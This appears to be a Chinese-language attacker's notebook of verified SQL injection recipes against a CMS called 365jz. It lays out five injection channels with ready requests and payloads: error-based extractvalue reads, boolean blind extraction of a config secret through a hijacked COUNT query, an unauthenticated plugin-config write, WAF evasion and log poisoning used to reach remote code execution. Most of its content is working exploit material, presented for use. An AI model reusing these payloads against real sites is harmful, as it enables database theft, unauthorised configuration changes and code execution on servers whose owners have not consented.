# 365jz 注入配方（已验证）

## 通道 A — `tid`（GET，数字型裸拼）
```
GET /index.php?act=list&tid=1 and extractvalue(1,concat(0x7e,user()))
→ XPATH: '~107_…@localhost'
```
- 无需引号；`(select` 拦 → **表数据读不出**（仅环境串）。
- 带 cookie `365aixue=365aixue.com`。

## 通道 B — `X-Rewrite-URL`
- 必须 `?act=list&isdirwz=Y` + 头值以 `/` 开头。
- 同 Checkquery → 同 `(select` 墙。

## 通道 C — pluginconfig[]（POST，免登录）
```
POST /index.php?act=plugins&identifier=comment&mod=config&do=var&dopost=save&pluginid=4
body: dopost=save&pluginconfig[<键>]=<值>
SQL: update zz_pluginvar set value='$fvalue' where pluginid='$pluginid' and variable='$fname'
```
- **读**：键里 extractvalue（无子查询环境串）。
- **写**：值改 plugin 配置。
- **2026-09-24 RCE 用**：键 = `{jz:global…}' and(select 1)and '`（**URL 编码键**）→ WAF 日志干净引号毒化。
- URL 的 pluginid 不进 SQL；须非空。

## 通道 D — tid 长度布尔（无子查询环境串）
```
tid=-1 or 1=1     → 大页
tid=-1 or 1=2     → 短页
tid=-1 or (ascii(substr(user(),N,1))=X)
```
- **不要** `if(cond, extractvalue(...), 0)`（5.7 两侧都算）。
- 读不出 admin.pwd。

## 通道 E — comment `ip=` COUNT FROM 劫持（2026-09-24 抽 CE / 读表主通道）
### 机制
1. comment 配置列表 SQL 含 `ip LIKE '$ip'`（或 keywords `LIKE '%$kw%'`）。
2. AppDatashow 对 `SELECT COUNT(*) AS dd FROM <orig>` 做贪婪替换：用户输入里的 `from <table>` 变成 COUNT 的 FROM。
3. `order by 1` 放在 COND 后 → 吃掉 SQL 尾巴引号（避 addslashes / WAF `#` `--`）。

### 配方（抽 CE）
```
GET /index.php?act=plugins&identifier=comment&mod=config&pluginid=4
  &ip=<urlencode>
Cookie: 365aixue=365aixue.com

ip 明文示例:
  x from zz_sysconfig where varname=0x636f6e6669675f636f6f6b69655f656e636f6465 and length(value)=33 order by 1
  x from zz_sysconfig where varname=0x… and ascii(substr(value,1,1))=90 order by 1
```
- **Oracle**：正文 `共 N 页/M条记录` 或 `M条记录` → `M>=1` 真 / `M=0` 假。
- 基线：`where 1=1` 常 M=100 级；`where 1=0` → M=0；`varname=0x…` 单独 → M=1。
- `varname` 用 **hex** 免引号；CE 在 **`value` 列**。
- 二分 ascii 后 **必须** equality VERIFY 每一位；假 CE 会指向空/旧 lockfile 时间戳文件。

### 与 WAF 关系
- payload **不要**带 `(select`（会 Safe Notes，COUNT 不执行）。
- 布尔阶段干净；毒化阶段另走 KEY + `(select` 故意触发日志。

### keywords 变体
- `act=search&keyword=` 有 **`cn_substr(30)`** → 长 payload 截断，**不适合抽 CE**。
- keywords 尾巴常是 `%')`，比 `ip` 的单 `'` 更难收；优先 `ip=`。

### 报错页用途
- 故意触发时完整 SQL 会印在 Safe Notes / system Error 里 → 确认 FROM 劫持与尾巴形态。
- `#` 注释 WAF 墙；GBK 宽字节在 utf8mb4 上无效。

## INTO DUMPFILE（别空转）
- 词不拦，但 WHERE/UPDATE 语法位 + 常无 FILE → 停。

## 响应指纹
- ~2xx B：`sql：…Safe Notes` = WAF 拦（毒化成功信号之一）
- ~2930B：XPATH 读值
- 配置列表：含 `条记录` 的评论/插件页 = COUNT 布尔载体
- `c4ca4238…` 开头 = action @eval 跑了 `print(md5(1))`

## 线索
- lockfile= 控路径写 time()；截断 safe.txt 用，不控内容。
- path leak：`identifier=notexist` → `/www/wwwroot/<root>/plugins/…插件不存在`。
